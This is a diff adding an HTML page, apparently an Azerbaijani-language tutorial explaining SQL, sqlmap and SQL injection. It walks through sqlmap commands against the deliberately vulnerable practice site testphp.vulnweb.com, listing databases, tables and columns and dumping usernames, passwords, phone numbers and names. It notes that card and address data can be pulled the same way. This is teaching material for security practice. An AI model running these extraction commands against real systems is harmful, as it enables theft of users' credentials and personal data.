@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body style="text-align: center;">
+    <h3>SQL Nədir?</h3>
+
+    <P>SQL (Structured Query Language) verilənlər bazası əməliyyatları üçün istifadə olunan sadə dildir. Demək olar ki, bir çox proqram və veb xidmətləri verilənlər bazası ehtiva edir. Verilənlər bazasını bir növ ərzaq kitabı kimi düşünün. Baqqal əmi kimi o kitabı yazacaqsan, həm də istədiyin vaxt silib redaktə edə biləcəksən, ya da istədiyin vaxt zəng edib lazımi işləri görəcəksən. Bu, rəqəmsallaşan dünyamıza, baqqal dayının elektron dilinə uyğunlaşmaq üçün formalaşmış bir növ dildir.</P>
+
+     <h3>SQLMAP Nədir?</h3> 
+    
+
+    <p>Sqlmap açıq mənbəli sql injection zəifliyinin aşkarlanması və istismarı vasitəsidir. O, ona təqdim edilən hədəf veb tətbiqi tərəfindən istifadə edilən verilənlər bazası sisteminə müxtəlif sorğular/əmrlər göndərməklə sistemdə sql inyeksiyasının növünü aşkar edir. Yenə hədəf verilənlər bazasından ona verilən parametrlərə uyğun müxtəlif məlumatlar götürür.  Bu, Terminal / Komanda Pəncərəsi, yəni konsol ekranı vasitəsilə işləyən SQL Injection zəiflikləri üçün istifadə edə biləcəyiniz səmərəli və məntiqi test (pentest) alətidir.
+
+ 
+
+        Komanda xəttində işlədiyindən və Python ilə işləndiyindən, bir çox əməliyyat sistemləri ilə işləyir. (Linux paylamaları, Windows, MacOS)
+        
+         
+        
+        Təhlükəsizlik zəifliklərini (zəifliklərini) tapmaqdan əlavə, sızmış istifadəçinin həssas məlumatlarını redaktə etmək, baxmaq, silmək kimi fantastik xüsusiyyətlərə malikdir. Bir çox DBSM (Data-Base Management System) ilə uyğun gəlir. O, həmçinin bir çox inyeksiya üsullarından istifadə edə bilər. Bundan əlavə, siz təmin etdiyiniz bir neçə parametrlə, yəni öz daxilindəki konfiqurasiyalardan istifadə etməklə zəiflikləri skan edə bilərsiniz.
+    </p>
+         <h3>SQL Injection Nədir?</h3>
+
+    <P>Bu bir növ hücum/hücum texnikasıdır. Bu zəifliyə bəzən meta-simvollar səbəb ola bilər. Bu veb proqramlardakı ciddi boşluqlardan biridir. Məhz bu gün də NASA və s. Hətta brend qurum və saytlarda da rast gəlmək olar və gözlənilməz zəiflik sadə də olsa, gözlənilməz yerlərdən baş ağrısı yarada bilər. Düşünürəm ki, bu, sadə, lakin təsirli olduğu üçün diqqətlə nəzərdən keçirilməli bir məsələdir. (Bu boşluq istənilən verilənlər bazası-tətbiq əlaqəsi olan proqram təminatında tapıla bilər, lakin bu dilə və bu verilənlər bazasına xas deyil.)
+
+        Əsasən bir şey öyrəndiyimizə görə, tətbiqlərimizə başlaya bilərik. Mən həmişəki kimi Kali Linux istifadə edəcəyəm. Hansı əməliyyat sistemindən istifadə etməyiniz çox da önəmli olmayacaq.
+        
+        Kali-də sqlmap artıq quraşdırılıb. Əgər başqa əməliyyat sistemi istifadə edirsinizsə və ya quraşdırılmayıbsa, yuxarıda verdiyim linkdən yükləyə bilərsiniz. Əgər siz Linux istifadəçisisinizsə, terminalınıza "apt install sqlmap" əmrini yazdığınız zaman o yüklənəcək.
+        
+        –dbs: verilənlər bazalarını göstərir.
+        –cədvəllər: verilənlər bazasında cədvəlləri göstərir.
+        –sütunlar: Verilənlər bazasındakı sütunlar göstərilir.
+        – dump: DBMS verilənlər bazası qeydlərini boşaltın.</P>
+
+
+        <h3>SQLMAP Tool-un İstifadəsi:</h3>
+
+    <p>İlk öncə terminalda "sqlmap" yazıb Enter edirik:</p>
+
+    <img src="C:\Users\User\Pictures\Screenshot 2023-05-20 154330.png"  width="700" height="300">
+
+    <h3>Sqlmap --h:</h3>
+
+    <img src="C:\Users\User\Pictures\sql1.png" height="200" >
+    <img src="C:\Users\User\Pictures\sql2.png" height="200">
+    <img src="C:\Users\User\Pictures\sql3.png" height="200" >    
+    <img src="C:\Users\User\Pictures\sql4.png" height="200">
+      
+          <p>Əvvəlcə kali linux-da bir Web Browser açırıq. Daha sonra Web Browser-də "vulnweb" yazıb enter edirik qarşımıza çıxan ilk səhifəyə daxil oluruq və daha sonra səhifədəki 2-ci linkə daxil oluruq. Daha sonra qarşımıza çıxan səhifədə "sing up" yerinə gəlirik və gördüyümüz kimi  bizdən "username" və "password" isdəyir biz "sqlmap tool-dan" istifadə etməklə məlumatları götürəciyik:
+          </p>
+
+          <img src="C:\Users\User\Pictures\sql5.png" width="450">
+          <img src="C:\Users\User\Pictures\sql6.png" width="450">
+          <img src="C:\Users\User\Pictures\sql7.png" width="450">
+          <img src="C:\Users\User\Pictures\sql8.png" width="450">
+          <img src="C:\Users\User\Desktop\c22.png"   width="450"><br>
+          <h3>Data Base:</h3>
+          <p>Əvvəlcə Data baselər-ə baxmaq üçün "sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=2" --dbs " yazırıq və Enter edirik. Gördüyümüz kimi qarşımıza 2 ədəd Data Base çıxır: 1)acuart 2)information_schema </p>
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$R3S6VOA.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RL49H7O.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$R90ABTB.png" width="450"><br>
+          <h3>Tables:</h3>
+          <p>Daha sonra Tables-ı gətirmək üçün "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart --tables" yazırıq və Enter edirik:</p>
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RE2Y0NY.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RYGIXZ5.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RMGL66C.png" width="450"><br>
+          <h3>Columns:</h3>
+          <p>Sütunları gətirmək üçün isə: "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D (Data base-in baş hərifi) acuart -T (Tables-in baş hərifi) users --columns"   yazıb Enter edirik.</p>
+          <img src="C:\Users\User\Desktop\or1.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RIZ9PNE.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RZX00UF.png" width="450"><br>
+          <h3>Username-in Tapılması:</h3>
+          <p>Sütunlardan da gördüyümüz kimi "pass, uname, credi card, email , name və.s" kimi məlumatlari tapmaq olar amma biz "pass və uname" tapsaq işimiz tamamlanır. Username-i tapmaq üçün: "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D(Data base-in baş hərifi) acuart -T(Tables-in baş hərifi) users -C(Columns-un baş hərifi) uname --dump" yazıb Enter edirik. Və gördüyümüz kimi Username tapıldı cavap test-dir </p>
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RC8SP52.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RWOMQVN.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RRVD63O.png" width="450"><br>
+          <h3>Password-n Tapılması:</h3>
+          <p>Password-u tapmaq üçün isə "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C pass --dump " yazıb Enter edirik. Və Password-muz da tapıldı cavap test-dir.</p>
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$RLYE1NX.png" width="450"> 
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$R8TF2FJ.png" width="450">
+          <img src="C:\$Recycle.Bin\S-1-5-21-1368637616-577401505-684798655-1001\$R1C48L0.png" width="450"><br>
+          <h3>Signup Hissəsi:</h3>
+          <p>Həm Username Həm də Password-u tapdığımıza görə "signup" hissəsindən Qeydiyatdan keçib daxil ola bilərik və şəkildə də gördüyümüz kimi biz phone number,name,email,credicard number-i də görə bilərik:</p>
+          <img src="C:\Users\User\Desktop\c23.png" width="450">
+          <img src="C:\Users\User\Desktop\c24.png" width="450">
+          <img src="C:\Users\User\Desktop\c25.png" width="450"><br>
+          <h3>Phone number:</h3>
+          <p>Bundan əlavə biz qeydiyatdan keçmədən də Phone Number-i , Name-i öyrənə bilərik. ilk öncə phone number-dən başlayaq bunun üçün "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C phone --dump" yazıb Enter edirik.</p>
+          <img src="C:\Users\User\Desktop\c16.png" width="450">
+          <img src="C:\Users\User\Desktop\c17.png" width="450">
+          <img src="C:\Users\User\Desktop\c18.png" width="450"><br>
+          <h3>Name:</h3>
+        <p>Name-i öyrənmək üçün isə "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C name --dump" yazıb Enter edirik.</p>
+          <img src="C:\Users\User\Desktop\c19.png" width="450">
+          <img src="C:\Users\User\Desktop\c20.png" width="450">
+          <img src="C:\Users\User\Desktop\c21.png" width="450"><br>
+
+           <h3>Qeyd: Eyni ardıcıllıqla biz səhifədə qeydiyatdan keçmədən email,credi card,adress məlumatlarında da tapa bilərik.</h3><br>
+           <h2>DİQQƏTİNİZ ÜÇÜN TƏŞƏKKÜRLƏR!</h2>
+            
+</body>
+</html>
